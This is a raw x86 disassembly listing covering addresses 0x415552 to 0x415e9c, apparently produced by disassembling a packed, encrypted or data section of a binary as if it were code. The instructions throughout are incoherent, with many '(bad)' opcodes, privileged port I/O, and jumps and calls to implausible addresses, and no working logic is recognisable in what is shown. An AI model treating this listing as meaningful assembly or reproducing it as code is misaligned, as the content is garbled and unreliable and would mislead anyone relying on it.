  415552:	xor    DWORD PTR ds:0x0,0x0
	...
  415568:	fs mov ah,0x81
  41556b:	xor    eax,0x6f81bcb4
  415570:	fwait
  415571:	nop
  415572:	or     cl,ch
  415574:	or     al,0x15
  415576:	repz sbb BYTE PTR ds:0xd1b0952,cl
  41557d:	push   esp
  41557e:	or     DWORD PTR [ecx],ebx
  415580:	arpl   ax,cx
  415582:	sub    al,0xed
  415584:	ds or  eax,esi
  415587:	xchg   ecx,eax
  415588:	es pop esp
  41558a:	cmc    
  41558b:	sahf   
  41558c:	inc    esp
  41558d:	shr    BYTE PTR [ecx+ebx*8],1
  415590:	inc    esp
  415591:	shr    BYTE PTR [edx*8-0x2ed347cc],0x64
  415599:	push   ebx
  41559a:	pop    edx
  41559b:	jb     0x415586
  41559d:	ret    
  41559e:	je     0x41556c
  4155a0:	(bad)  
  4155a1:	scas   eax,DWORD PTR es:[edi]
  4155a2:	sti    
  4155a3:	outs   dx,BYTE PTR ds:[esi]
  4155a4:	test   al,0xc0
  4155a6:	pop    ecx
  4155a7:	jb     0x41557a
  4155a9:	or     al,0x4c
  4155ab:	add    eax,0x5c1d3cac
  4155b0:	jo     0x415604
  4155b2:	sbb    DWORD PTR [ebp+0x2178b3],0xe2871ea4
  4155bc:	jbe    0x415553
  4155be:	retf   0xad8b
  4155c1:	push   esi
  4155c2:	std    
  4155c3:	add    cl,dh
  4155c5:	mov    bl,0xe0
  4155c7:	push   DWORD PTR [ecx+0x40]
  4155ca:	repz push ebp
	...
  4155e0:	push   es
  4155e1:	int    0xc6
  4155e3:	mov    ecx,esi
  4155e5:	jnp    0x41560b
  4155e7:	call   0x34a183
  4155ec:	mov    esi,0x51447f0f
  4155f1:	jl     0x415612
  4155f3:	enter  0xf36,0xb0
  4155f7:	jmp    0xf76822c3
  4155fc:	cmp    al,0x6a
  4155fe:	repnz mov edi,DWORD PTR [edi]
  415601:	pop    edx
  415602:	in     eax,dx
  415603:	pop    ds
  415604:	not    BYTE PTR [ecx]
  415606:	jg     0x41564c
  415608:	xchg   ecx,eax
  415609:	test   BYTE PTR [edi],al
  41560b:	enter  0x718e,0x71
  41560f:	or     BYTE PTR [edx],dh
  415611:	aad    0x2c
  415613:	adc    al,0xf4
  415615:	xchg   edi,eax
  415616:	or     BYTE PTR [eax],al
  415618:	jo     0x415659
  41561a:	jle    0x415644
  41561c:	out    dx,al
  41561d:	push   esp
  41561e:	je     0x415644
  415620:	ds in  al,0x2c
  415623:	xor    BYTE PTR [ebp+0xdce7fea],al
  415629:	or     bh,ah
  41562b:	dec    DWORD PTR [edx]
  41562d:	aam    0xd0
  41562f:	mov    esi,DWORD PTR [ecx+0x74]
  415632:	and    BYTE PTR [ebp-0x7b],dl
  415635:	rol    esi,cl
  415637:	call   0x349a83
  41563c:	outs   dx,BYTE PTR ds:[esi]
  41563d:	pusha  
  41563e:	add    ecx,DWORD PTR [eax+edx*4+0x89a]
	...
  415655:	add    BYTE PTR [eax],al
  415657:	add    BYTE PTR [esi+edi*4+0x3da02460],cl
  41565e:	repnz adc BYTE PTR [esi+0x1700093f],0x31
  415666:	adc    eax,0xf18a0958
  41566b:	and    edi,0x3c
  41566e:	or     DWORD PTR [eax],eax
  415670:	(bad)  
  415672:	or     ecx,DWORD PTR ds:0xc0d12
  415678:	mov    WORD PTR [esi-0x491fdba8],?
  41567e:	mov    cl,0x29
  415680:	inc    edi
  415681:	enter  0xa08,0x67
  415685:	jp     0x415701
  415687:	add    dl,BYTE PTR [edi]
  415689:	sbb    BYTE PTR [ecx+ecx*4-0x30],0x59
  41568e:	add    eax,0x5c8e3329
  415693:	mov    ebx,DWORD PTR [eax-0x67]
  415696:	and    BYTE PTR [edi+0x17],cl
  415699:	sti    
  41569a:	jae    0x4156f8
  41569c:	mov    al,0x99
  41569e:	aam    0xcc
  4156a0:	sti    
  4156a1:	pop    ecx
  4156a2:	loop   0x4156db
  4156a4:	push   0x98723899
  4156a9:	mov    dh,0x45
  4156ab:	and    al,0x9c
  4156ad:	stos   BYTE PTR es:[edi],al
  4156ae:	pop    esi
  4156af:	mov    edx,eax
  4156b1:	and    al,0x20
  4156b3:	hlt    
  4156b4:	retf   
  4156b5:	xor    DWORD PTR [esi-0x28],esi
  4156b8:	pop    ss
  4156b9:	sub    DWORD PTR [eax],0x38
	...
  4156cf:	add    BYTE PTR [ebx-0x73],ah
  4156d2:	jne    0x4156a2
  4156d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156d5:	push   0xffffffe5
  4156d7:	std    
  4156d8:	stos   DWORD PTR es:[edi],eax
  4156d9:	push   ebp
  4156da:	into   
  4156db:	mov    DWORD PTR [eax+0x61],eax
  4156de:	add    eax,0x3db67c7e
  4156e3:	and    al,0x5c
  4156e5:	xchg   esp,eax
  4156e6:	jp     0x415737
  4156e8:	mov    al,0x88
  4156ea:	js     0x415723
  4156ec:	test   al,0x8c
  4156ee:	push   0x6a90b04f
  4156f3:	aas    
  4156f4:	test   al,0xa4
  4156f6:	xchg   esi,eax
  4156f7:	push   esi
  4156f8:	mov    esp,0xa9db251d
  4156fd:	inc    ebx
  4156fe:	ds jmp 0xe3b9:0x2c0be105
  415706:	jp     0x4156c1
  415708:	adc    eax,0x3dec176d
  41570d:	push   edx
  41570e:	push   ds
  41570f:	cs dec ebp
  415711:	mov    ds:0x948ca254,al
  415716:	fistp  QWORD PTR [esi-0x38]
  415719:	js     0x4156f2
  41571b:	add    bh,BYTE PTR cs:[ecx-0x1d]
  41571f:	add    ecx,DWORD PTR [edi+eax*8+0x78b87e97]
  415726:	repz jl 0x415779
  415729:	js     0x41571a
  41572b:	push   eax
  41572c:	pop    esi
  41572d:	in     al,0x6a
  41572f:	mov    edx,0xe9cf46e4
	...
  415748:	icebp  
  415749:	out    0x12,eax
  41574b:	jge    0x415727
  41574d:	sbb    ebp,DWORD PTR [ebx]
  41574f:	and    BYTE PTR [eax-0x260a5ac4],dh
  415755:	push   ecx
  415756:	push   0x38
  415758:	test   al,0x78
  41575a:	loop   0x415717
  41575c:	adc    eax,0xb463c66
  415761:	loope  0x415726
  415763:	sbb    ebx,DWORD PTR [esi+0x1d]
  415766:	xchg   ebp,eax
  415767:	fdiv   st(4),st
  415769:	inc    ebp
  41576a:	mov    gs,ecx
  41576c:	adc    eax,0x68407a6d
  415771:	mov    WORD PTR [eax],cs
  415773:	push   ds
  415774:	inc    eax
  415775:	sbb    eax,esi
  415777:	sub    edi,0x966f543
  41577d:	shr    DWORD PTR [ecx*1-0x527e9377],0x9b
  415785:	js     0x4157b8
  415787:	sub    dh,cl
  415789:	lock sub al,0xa1
  41578c:	cmc    
  41578d:	fabs   
  41578f:	in     eax,0xe0
  415791:	lock sub al,0x91
  415794:	fcomp  st(0)
  415796:	sub    al,0xf1
  415798:	mov    al,ds:0x8fed2c1a
  41579d:	xchg   esp,eax
  41579e:	jnp    0x415790
  4157a0:	or     BYTE PTR [edx],dl
  4157a2:	and    ch,ch
  4157a4:	(bad)  
  4157a5:	xchg   esp,eax
  4157a6:	or     BYTE PTR [ebp-0x13f77280],dl
	...
  4157c0:	(bad)  
  4157c1:	xchg   esp,eax
  4157c2:	je     0x4157a8
  4157c4:	or     BYTE PTR [edi+0xa],cl
  4157c7:	jge    0x41583a
  4157c9:	shl    DWORD PTR [ebp+eax*8+0x67],1
  4157cd:	xchg   esp,eax
  4157ce:	jae    0x4157b9
  4157d0:	(bad)  
  4157d1:	ror    BYTE PTR [ebx],1
  4157d3:	push   0xfffffff4
  4157d5:	xchg   edx,eax
  4157d6:	jl     0x4157d2
  4157d8:	js     0x4157ba
  4157da:	sub    al,0x11
  4157dc:	pop    ebp
  4157dd:	loope  0x415760
  4157df:	mov    bh,0xc7
  4157e1:	popa   
  4157e2:	stc    
  4157e3:	mov    esi,0x62383af4
  4157e8:	push   ebx
  4157e9:	js     0x41583b
  4157eb:	bound  edx,QWORD PTR [ebx-0x1f8de788]
  4157f1:	jp     0x4157d0
  4157f3:	cmp    ebx,DWORD PTR [eax+0x1b]
  4157f6:	mov    BYTE PTR [ecx-0x710abbde],0xa4
  4157fd:	xlat   BYTE PTR ds:[ebx]
  4157fe:	sub    al,0x0
  415800:	lds    edx,FWORD PTR [edi]
  415802:	jecxz  0x415805
  415804:	cwde   
  415805:	xor    bl,bh
  415807:	adc    ch,BYTE PTR [esi]
  415809:	loope  0x415837
  41580b:	adc    BYTE PTR [eax],dh
  41580d:	nop
  41580e:	repz push ecx
  415810:	inc    edi
  415811:	rol    esi,1
  415813:	call   0x349c1f
  415818:	xchg   esi,eax
  415819:	cmp    eax,0x4d66fd87
  41581e:	test   BYTE PTR [ecx-0x74f76b8b],al
	...
  415838:	jmp    0x4157d9
  41583a:	or     al,0x0
  41583c:	fist   WORD PTR gs:[edi+0x50]
  415840:	out    dx,al
  415841:	or     eax,0x3ca51ee0
  415846:	repz mov esi,ecx
  415849:	scas   eax,DWORD PTR es:[edi]
  41584a:	and    BYTE PTR [ebp-0xc],dl
  41584d:	rol    dh,1
  41584f:	mov    edi,DWORD PTR [ebp+0x6b]
  415852:	clc    
  415853:	repnz xchg edx,eax
  415855:	cmp    al,0x2f
  415857:	ret    
  415858:	mov    ds:0x49447fab,al
  41585d:	lods   al,BYTE PTR ds:[esi]
  41585e:	das    
  41585f:	xchg   BYTE PTR [ecx+0x50],cl
  415862:	cmc    
  415863:	jmp    FWORD PTR [eax+0x51]
  415866:	mov    BYTE PTR [esi+0x8949d],bh
  41586c:	in     eax,0xbf
  41586e:	dec    ecx
  41586f:	cmp    eax,0x894e5
  415874:	push   ecx
  415875:	xchg   ebp,eax
  415876:	xchg   ebp,edi
  415878:	idiv   DWORD PTR [edi-0x431ac2f5]
  41587e:	or     BYTE PTR [eax],al
  415880:	mov    eax,ds:0xd95c7f82
  415885:	fisttp DWORD PTR [ebp-0x76603694]
  41588b:	in     eax,dx
  41588c:	mov    WORD PTR [ecx+0x4a1a892c],?
  415892:	cmc    
  415893:	jmp    FWORD PTR [ebx-0x2d76a556]
  415899:	and    eax,0xf02b
	...
  4158ae:	add    BYTE PTR [eax],al
  4158b0:	fwait
  4158b1:	(bad)  
  4158b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158b3:	call   DWORD PTR [ebx+0x11ff093d]
  4158b9:	push   ecx
  4158ba:	cmc    
  4158bb:	inc    DWORD PTR [ebx-0x5fdbb75c]
  4158c1:	jo     0x4158ac
  4158c3:	mov    edx,eax
  4158c5:	inc    eax
  4158c6:	out    dx,al
  4158c7:	jmp    0x24821b92
  4158cc:	(bad)
  4158d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158d1:	xor    BYTE PTR [ecx-0x77],bl
  4158d4:	inc    edx
  4158d5:	aad    0x9
  4158d7:	icebp  
  4158d8:	dec    ebx
  4158d9:	jbe    0x4158e6
  4158db:	scas   al,BYTE PTR es:[edi]
  4158dc:	cwde   
  4158dd:	cmp    DWORD PTR [ecx],ecx
  4158df:	add    BYTE PTR [ecx],cl
  4158e1:	or     DWORD PTR [eax],eax
  4158e3:	std    
  4158e4:	daa    
  4158e5:	pusha  
  4158e6:	jb     0x415944
  4158e8:	jo     0x4158df
  4158ea:	xchg   ebp,edi
  4158ec:	cdq    
  4158ed:	addr16 jb 0x41593c
  4158f0:	jo     0x415947
  4158f2:	jb     0x41588a
  4158f4:	js     0x41592f
  4158f6:	or     DWORD PTR [eax],eax
  4158f8:	adc    eax,0x153c28e9
  4158fd:	sub    DWORD PTR [eax],0x28910538
  415903:	adc    BYTE PTR [ebx+0x52],cl
  415906:	add    eax,DWORD PTR [ebx+0x450990eb]
  41590c:	idiv   DWORD PTR ds:0x41808672
  415912:	or     DWORD PTR [eax],eax
	...
  415928:	aas    
  415929:	lods   eax,DWORD PTR ds:[esi]
  41592a:	jno    0x4158fa
  41592c:	mov    ah,0x93
  41592e:	push   ebp
  41592f:	(bad)  
  415930:	ror    DWORD PTR [esi-0x6a],0x7d
  415934:	mov    al,ds:0xf03df98
  415939:	dec    edi
  41593a:	(bad)  
  41593b:	jg     0x4158f2
  41593d:	xchg   ebx,eax
  41593e:	fild   WORD PTR [ebx]
  415940:	gs ror bl,1
  415943:	daa    
  415944:	mov    DWORD PTR [ecx],ebx
  415946:	add    BYTE PTR [ebx],0x8c
  415949:	xchg   esp,eax
  41594a:	push   0x4f
  41594c:	mov    al,0xe8
  41594e:	jp     0x415906
  415950:	mov    ch,0x59
  415952:	inc    DWORD PTR fs:[ebp-0x7192d977]
  415959:	sbb    DWORD PTR [esi],ebp
  41595b:	push   ebx
  41595c:	adc    eax,0x151003d9
  415961:	cmp    bl,BYTE PTR [edx]
  415963:	xlat   BYTE PTR ds:[ebx]
  415964:	mov    edi,0xa8376ce4
  415969:	nop
  41596a:	nop
  41596b:	jp     0x4159c7
  41596d:	sbb    al,0x9b
  41596f:	pop    ds
  415970:	push   0x39f09d3c
  415975:	dec    esi
  415976:	fsub   DWORD PTR [edi+0x68]
  415979:	mov    BYTE PTR [ecx-0x3c16ead1],dl
  41597f:	xor    edi,DWORD PTR [ecx+0x24b57ae2]
  415985:	ss lock in eax,0x11
  415989:	sbb    al,BYTE PTR [edi]
  41598b:	jp     0x41598d
	...
  41599d:	add    BYTE PTR [eax],al
  41599f:	add    BYTE PTR [eax+0x78],dl
  4159a2:	daa    
  4159a3:	dec    ebp
  4159a4:	pop    esp
  4159a5:	sbb    DWORD PTR [ebp-0x21bc2b24],esp
  4159ab:	in     eax,0xb5
  4159ad:	push   edi
  4159ae:	push   0x58
  4159b0:	mov    al,0xa8
  4159b2:	dec    ebp
  4159b3:	adc    al,0x15
  4159b5:	loope  0x4159c2
  4159b7:	xor    al,0x5
  4159b9:	jmp    0x15dd66c6
  4159be:	inc    esp
  4159bf:	add    eax,0xcd5c1578
  4159c4:	imul   ebx,DWORD PTR [ebx],0x4c
  4159c7:	lds    ebx,FWORD PTR [edi+0x35395be7]
  4159cd:	pop    esi
  4159ce:	loopne 0x415988
  4159d0:	ret    0xf54f
  4159d3:	jb     0x415a39
  4159d5:	js     0x415a07
  4159d7:	push   ss
  4159d8:	aas    
  4159d9:	sbb    eax,esi
  4159db:	bound  esi,QWORD PTR [eax+0x7178a93c]
  4159e1:	dec    edi
  4159e2:	xor    DWORD PTR [ebx+ebp*8],ebp
  4159e5:	mov    al,BYTE PTR [ecx+0x318c9ba5]
  4159eb:	outs   dx,DWORD PTR ds:[esi]
  4159ec:	lods   al,BYTE PTR ds:[esi]
  4159ed:	cwde   
  4159ee:	or     cl,ch
  4159f0:	cli    
  4159f1:	xchg   ebp,eax
  4159f2:	mov    DWORD PTR [edi-0x16f76780],eax
  4159f8:	(bad)
  4159fc:	(bad)  
  4159fd:	xchg   ecx,eax
  4159fe:	or     cl,ch
  415a00:	mov    bl,0x91
  415a02:	mov    DWORD PTR [esi],esp
	...
  415a18:	mov    cs,eax
  415a1a:	paddusb mm1,QWORD PTR [edi-0x5416f737]
  415a21:	xchg   ecx,eax
  415a22:	mov    DWORD PTR [esi],ecx
  415a24:	(bad)  
  415a25:	enter  0x9e03,0xbf
  415a29:	sbb    eax,esi
  415a2b:	adc    DWORD PTR ds:0x5cf6f53d,esi
  415a31:	dec    edi
  415a32:	loope  0x4159fd
  415a34:	test   al,al
  415a36:	sub    al,0xf9
  415a38:	add    cl,BYTE PTR [ebp-0xb]
  415a3b:	jmp    0x31a75cf
  415a40:	shl    ecx,0x5b
  415a43:	bound  esp,QWORD PTR [ecx]
  415a45:	cmp    al,0xcd
  415a47:	add    BYTE PTR [ebx+0x6645f337],bh
  415a4d:	push   0xc9c874f5
  415a52:	fs and al,0xe5
  415a55:	retf   
  415a56:	dec    esp
  415a57:	and    al,0x81
  415a59:	rol    DWORD PTR [eax-0x77],cl
  415a5c:	jns    0x415ad2
  415a5e:	push   eax
  415a5f:	cmp    edi,ebp
  415a61:	inc    edi
  415a62:	xchg   DWORD PTR [edi-0x7a0cc803],esi
  415a68:	or     cl,BYTE PTR [eax-0x77]
  415a6b:	pushf  
  415a6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a6d:	nop
  415a6e:	or     BYTE PTR [ebx-0x79fc6de6],al
  415a74:	not    BYTE PTR [edi-0x7c01fff8]
  415a7a:	sub    al,0x10
	...
  415a90:	inc    edx
  415a91:	int    0xc7
  415a93:	sub    esp,DWORD PTR [edx-0x7474ba19]
  415a99:	outs   dx,DWORD PTR ds:[esi]
  415a9a:	and    ebp,esi
  415a9c:	retf   0x7f30
  415a9f:	push   esp
  415aa0:	xchg   ecx,eax
  415aa1:	js     0x415afe
  415aa3:	push   edx
  415aa4:	out    dx,al
  415aa5:	add    DWORD PTR [edi-0x18],edi
  415aa8:	int    0x96
  415aaa:	in     eax,0xff
  415aac:	push   0x7c
  415aae:	leave  
  415aaf:	jg     0x415aa1
  415ab1:	int3   
  415ab2:	dec    esp
  415ab3:	and    al,0x5d
  415ab5:	jge    0x415a45
  415ab7:	and    al,0x31
  415ab9:	cwde   
  415aba:	or     BYTE PTR [ebp+0x1c],dh
  415abd:	adc    eax,0x983128b6
  415ac2:	or     BYTE PTR [eax],al
  415ac4:	xchg   ecx,eax
  415ac5:	lahf   
  415ac6:	xor    DWORD PTR [eax],eax
  415ac8:	lock xchg edi,eax
  415aca:	or     BYTE PTR [eax+esi*8+0x12],bh
  415ace:	repz add ah,BYTE PTR [ecx+0x7c]
  415ad2:	xor    DWORD PTR [eax],eax
  415ad4:	mov    eax,fs
  415ad6:	or     al,0x0
  415ad8:	push   0x8ffd8e30
  415add:	mov    esp,esi
  415adf:	push   esp
  415ae0:	cmp    al,0xc6
  415ae2:	(bad)  
  415ae4:	inc    ebp
  415ae5:	or     al,0xe9
  415ae7:	std    
  415ae8:	mov    bh,0x43
  415aea:	dec    eax
  415aeb:	pop    ecx
  415aec:	arpl   WORD PTR [esi-0x41a5023c],di
  415af2:	sar    BYTE PTR [eax],0x0
	...
  415b05:	add    BYTE PTR [eax],al
  415b07:	add    dh,cl
  415b09:	inc    ebp
  415b0a:	or     DWORD PTR [ecx-0x7706aec8],ecx
  415b10:	iret   
  415b11:	retw   0x4150
  415b15:	(bad)  
  415b16:	(bad)  
  415b18:	jae    0x415b2d
  415b1a:	jmp    0xfa002d1c
  415b1f:	(bad)  
  415b20:	clc    
  415b21:	loopne 0x415b08
  415b23:	adc    BYTE PTR [edi],al
  415b25:	add    DWORD PTR ds:0xe9f60110,ebp
  415b2b:	dec    edi
  415b2c:	mov    esi,0x8be8dab6
  415b31:	jecxz  0x415b1c
  415b33:	std    
  415b34:	pop    es
  415b35:	or     DWORD PTR ds:0x93c1154,ebp
  415b3b:	add    BYTE PTR [esi+eax*2-0x3f928e36],cl
  415b42:	jne    0x415b44
  415b44:	mov    WORD PTR ds:0x490a8909,?
  415b4a:	or     eax,0x390e8c00
  415b4f:	mov    DWORD PTR [edx-0x5b],edx
  415b52:	fucomip st,st(3)
  415b54:	sbb    ecx,DWORD PTR [edx+0xc]
  415b57:	scas   al,BYTE PTR es:[edi]
  415b58:	js     0x415b93
  415b5a:	or     DWORD PTR [eax],eax
  415b5c:	(bad)  
  415b5d:	cwde   
  415b5e:	adc    eax,0xc4947edd
  415b63:	xchg   ch,al
  415b65:	dec    edx
  415b66:	loopne 0x415ae9
  415b68:	nop
  415b69:	nop
  415b6a:	fild   WORD PTR [ebx]
	...
  415b80:	pop    ss
  415b81:	fucomip st,st(0)
  415b83:	pop    eax
  415b84:	jnp    0x415ba5
  415b86:	gs repz (bad) 
  415b89:	xchg   esp,eax
  415b8a:	fisttp WORD PTR [edx+ecx*1-0x73fc1c54]
  415b91:	aam    0x68
  415b93:	xchg   ecx,eax
  415b94:	mov    al,ds:0x1303df90
  415b99:	adc    ch,bh
  415b9b:	pop    es
  415b9c:	mov    WORD PTR [edx+ebp*2-0x206f7b77],ss
  415ba3:	add    edx,DWORD PTR [esi]
  415ba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ba6:	loope  0x415b5d
  415ba8:	call   0xdb28:0x92f37755
  415baf:	pop    es
  415bb0:	mov    WORD PTR [esp+edi*8-0x10eceb04],ss
  415bb7:	pop    es
  415bb8:	mov    WORD PTR [eax+edi*2-0x206f6b77],ss
  415bbf:	add    ecx,esp
  415bc1:	sbb    edx,DWORD PTR [ebp-0x1]
  415bc4:	(bad)  
  415bc5:	xchg   esp,eax
  415bc6:	fisttp WORD PTR [edx+edx*1-0x73fc145b]
  415bcd:	sbb    eax,0x948ffb65
  415bd2:	fisttp WORD PTR [ebp-0x1ece6964]
  415bd8:	dec    esi
  415bd9:	sbb    eax,0xa91204ef
  415bde:	jecxz  0x415be3
  415be0:	mov    WORD PTR [edi+0x8ef8],?
	...
  415bf6:	add    BYTE PTR [eax],al
  415bf8:	or     ah,BYTE PTR [ebp+0x1b8c03e3]
  415bfe:	ins    DWORD PTR es:[edi],dx
  415bff:	sti    
  415c00:	(bad)  
  415c01:	xchg   esp,eax
  415c02:	or     cl,ch
  415c04:	dec    edi
  415c05:	adc    DWORD PTR [esi+0x8948bcd],eax
  415c0b:	jo     0x415c13
  415c0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c0e:	or     al,0xe9
  415c10:	(bad)  
  415c11:	sbb    ecx,DWORD PTR [esi+0x89493f1]
  415c17:	mov    ecx,0xd98e1ba8
  415c1c:	xchg   ebx,eax
  415c1d:	xchg   esp,eax
  415c1e:	or     BYTE PTR [edi+0x67819488],ah
  415c24:	mov    WORD PTR [eax+0x1310e908],ss
  415c2a:	adc    ch,ch
  415c2c:	(bad)  
  415c2d:	xchg   esp,eax
  415c2e:	pop    es
  415c2f:	dec    edi
  415c30:	mov    eax,0x78e90895
  415c35:	pop    ebp
  415c36:	fcmove st,st(1)
  415c38:	adc    cl,dl
  415c3a:	sub    al,0x25
  415c3c:	adc    edx,DWORD PTR [ebp+0x7c]
  415c3f:	mov    eax,0x92cd900
  415c44:	sbb    DWORD PTR [edx],esp
  415c46:	sbb    ch,ah
  415c48:	(bad)  
  415c49:	xchg   esp,eax
  415c4a:	and    DWORD PTR [ebp+0x7257e4b3],edi
  415c50:	push   ds
  415c51:	mov    al,ds:0x7b8fe90c
  415c56:	inc    esp
  415c57:	add    eax,0x9e57e698
	...
  415c70:	ins    BYTE PTR es:[edi],dx
  415c71:	mov    DWORD PTR fs:0xbcc81658,esp
  415c78:	fwait
  415c79:	in     eax,dx
  415c7a:	sub    DWORD PTR [edx],0x6a56e781
  415c80:	inc    esp
  415c81:	mov    edx,cs
  415c83:	add    DWORD PTR [eax-0x6c0671e5],ecx
  415c89:	xchg   esp,eax
  415c8a:	or     dl,al
  415c8c:	retf   
  415c8d:	jo     0x415ce7
  415c8f:	add    al,dh
  415c91:	xchg   DWORD PTR [ebx+0x5e],edx
  415c94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c95:	pop    esp
  415c96:	xor    dl,al
  415c98:	fst    QWORD PTR [eax+esi*4+0x896f500]
  415c9f:	ret    
  415ca0:	jle    0x415c73
  415ca2:	sub    al,0x4
  415ca4:	jle    0x415d03
  415ca6:	mov    ch,0xe9
  415ca8:	neg    BYTE PTR [ecx]
  415caa:	dec    esp
  415cab:	or     BYTE PTR [ebp-0x76bb80b1],dh
  415cb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cb2:	jne    0x415ca0
  415cb4:	sbb    DWORD PTR [eax+ecx*1+0x79553800],0x24513407
  415cbf:	add    al,0xa5
  415cc1:	xchg   esp,eax
  415cc2:	(bad)  
  415cc3:	mov    esp,DWORD PTR [ecx]
  415cc5:	jno    0x415d13
  415cc7:	add    al,0xb5
  415cc9:	xchg   esp,eax
  415cca:	jg     0x415c60
  415ccc:	leave  
  415ccd:	aam    0xc
  415ccf:	add    BYTE PTR [ebp+0x8c7f85],ah
	...
  415ce5:	add    BYTE PTR [eax],al
  415ce7:	add    cl,cl
  415ce9:	aam    0xc
  415ceb:	add    BYTE PTR [ebp-0x7e],dh
  415cee:	jg     0x415c84
  415cf0:	dec    ecx
  415cf1:	test   al,0xc
  415cf3:	add    BYTE PTR [ebp-0x7d],ah
  415cf6:	pop    eax
  415cf7:	mov    ebp,ecx
  415cf9:	outs   dx,DWORD PTR ds:[esi]
  415cfa:	dec    eax
  415cfb:	add    al,0x75
  415cfd:	xchg   esp,eax
  415cfe:	pop    edx
  415cff:	push   eax
  415d00:	rcl    bh,0x2c
  415d03:	sbb    BYTE PTR [ebp-0x6d00067d],bh
  415d09:	adc    cl,ah
  415d0b:	sub    al,0x39
  415d0d:	xchg   esp,eax
  415d0e:	or     bl,al
  415d10:	mov    eax,ds:0x81ccc457
  415d15:	push   edi
  415d16:	(bad)  
  415d17:	int3   
  415d18:	popa   
  415d19:	push   edi
  415d1a:	(bad)  
  415d1b:	int3   
  415d1c:	mov    WORD PTR [eax],cs
  415d1e:	and    bl,0xd
  415d21:	dec    edx
  415d22:	fiadd  DWORD PTR [eax]
  415d24:	mov    WORD PTR ds:0xc2bb563c,?
  415d2a:	or     BYTE PTR ds:[ebp+0x3fb618a2],bh
  415d31:	mov    dl,0x4f
  415d33:	aas    
  415d34:	mov    esp,es
  415d36:	fdivr  QWORD PTR [edi-0x49f9c50c]
  415d3c:	nop
  415d3d:	dec    ebp
  415d3e:	test   bh,ch
  415d40:	minps  xmm1,XMMWORD PTR ds:0x3c2230d
  415d47:	adc    al,0x5a
  415d49:	jl     0x415d57
  415d4b:	add    DWORD PTR [eax],0x0
	...
  415d5e:	add    BYTE PTR [eax],al
  415d60:	aam    0x2e
  415d62:	jo     0x415d33
  415d64:	xchg   ebx,eax
  415d65:	mov    edi,0x905088cb
  415d6a:	les    eax,FWORD PTR [ecx+0xf]
  415d6d:	repz adc edi,DWORD PTR [ebp+edi*4+0x6c]
  415d72:	mov    bh,0x66
  415d74:	setns  BYTE PTR [eax]
  415d77:	jmp    DWORD PTR [eax]
  415d79:	inc    ebx
  415d7a:	test   al,dl
  415d7c:	fwait
  415d7d:	cmc    
  415d7e:	xchg   esi,eax
  415d7f:	dec    esp
  415d80:	mov    WORD PTR [edi-0x1e],ds
  415d83:	add    DWORD PTR [ecx],edx
  415d85:	imul   esi,edi,0x8a3cf58a
  415d8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d8c:	xor    DWORD PTR [ebp-0x2a],ecx
  415d8f:	std    
  415d90:	imul   edi,DWORD PTR ds:0x4d11a48a,0xffffffd6
  415d97:	std    
  415d98:	pop    ebx
  415d99:	cmp    eax,0xbf83d91c
  415d9e:	mov    bh,BYTE PTR [edx+eax*8+0x788b08fc]
  415da5:	gs mov bh,dh
  415da8:	cwde   
  415da9:	xchg   esp,eax
  415daa:	lods   al,BYTE PTR ds:[esi]
  415dab:	or     DWORD PTR [esi],eax
  415dad:	rcr    ah,1
  415daf:	retf   
  415db0:	adc    al,0xd0
  415db2:	cld    
  415db3:	jae    0x415dea
  415db5:	pushf  
  415db6:	imul   ecx,DWORD PTR [eax+0x5f],0x774876f8
  415dbd:	and    al,0xa2
  415dbf:	add    BYTE PTR ds:0xbc7ba8,0x0
	...
  415dd6:	add    BYTE PTR [eax],al
  415dd8:	inc    ebp
  415dd9:	test   al,0xdf
  415ddb:	add    ecx,DWORD PTR [edi+edx*4-0x41cf7e6b]
  415de2:	and    BYTE PTR [edi+edx*1],al
  415de5:	xor    bh,0x82
  415de8:	loop   0x415d75
  415dea:	inc    esp
  415deb:	or     al,BYTE PTR [esi]
  415ded:	shl    ah,1
  415def:	retf   
  415df0:	add    al,0xd0
  415df2:	aam    0x73
  415df4:	mov    ch,0x9b
  415df6:	imul   eax,DWORD PTR [edi+0x7f],0x974766f8
  415dfd:	and    al,0x22
  415dff:	xor    DWORD PTR [ebp+0x7bbd138b],0x6b
  415e06:	out    dx,al
  415e07:	xchg   ebp,eax
  415e08:	or     eax,0x8c451d58
  415e0d:	adc    al,0xb
  415e0f:	or     esp,edi
  415e11:	xchg   ebx,eax
  415e12:	sti    
  415e13:	or     eax,0x275c9115
  415e18:	cli    
  415e19:	rcr    edi,cl
  415e1b:	or     al,0x10
  415e1d:	sbb    bh,ch
  415e1f:	fidiv  WORD PTR [ecx+0x46]
  415e22:	out    0x95,al
  415e24:	or     eax,0x8c44d531
  415e29:	adc    al,0xc3
  415e2b:	or     ah,bh
  415e2d:	xchg   esp,eax
  415e2e:	mov    bl,0xd
  415e30:	add    eax,0xc2275491
  415e35:	ror    DWORD PTR [eax],cl
  415e37:	jmp    0xd9f46ecc
	...
  415e50:	pop    edx
  415e51:	dec    eax
  415e52:	cmc    
  415e53:	stos   BYTE PTR es:[edi],al
  415e54:	push   cs
  415e55:	dec    esp
  415e56:	adc    BYTE PTR [ebp+0x1389d34d],bl
  415e5c:	pop    ds
  415e5d:	cdq    
  415e5e:	test   bl,dl
  415e60:	cmp    cl,BYTE PTR [eax-0xb]
  415e63:	je     0x415e69
  415e65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e66:	cmc    
  415e67:	(bad)  
  415e68:	jmp    0x90223f51
  415e6d:	xchg   esp,eax
  415e6e:	or     BYTE PTR [esi-0x2a801447],cl
  415e74:	mov    bl,0x52
  415e76:	add    cl,ch
  415e78:	mov    ds:0xdc68eb0d,al
  415e7d:	adc    al,0x8
  415e7f:	jmp    0x1ea04213
  415e84:	add    eax,0x836c00d2
  415e89:	adc    al,0xaf
  415e8b:	(bad)  [edi-0x329ff76c]
  415e91:	adc    ecx,eax
  415e93:	in     eax,dx
  415e94:	add    al,0x84
  415e96:	xchg   DWORD PTR [edi-0x160b6b70],eax
  415e9c:	into   
